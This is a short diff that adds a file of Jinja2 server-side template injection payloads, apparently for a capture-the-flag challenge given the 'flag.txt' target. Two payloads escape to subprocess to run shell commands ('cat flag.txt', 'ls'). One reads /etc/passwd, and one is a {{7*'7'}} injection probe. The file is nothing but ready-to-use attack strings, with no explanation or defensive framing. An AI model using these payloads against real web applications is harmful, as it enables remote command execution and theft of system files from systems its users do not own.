@@ -1,0 +1,4 @@
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+{{7*'7'}}
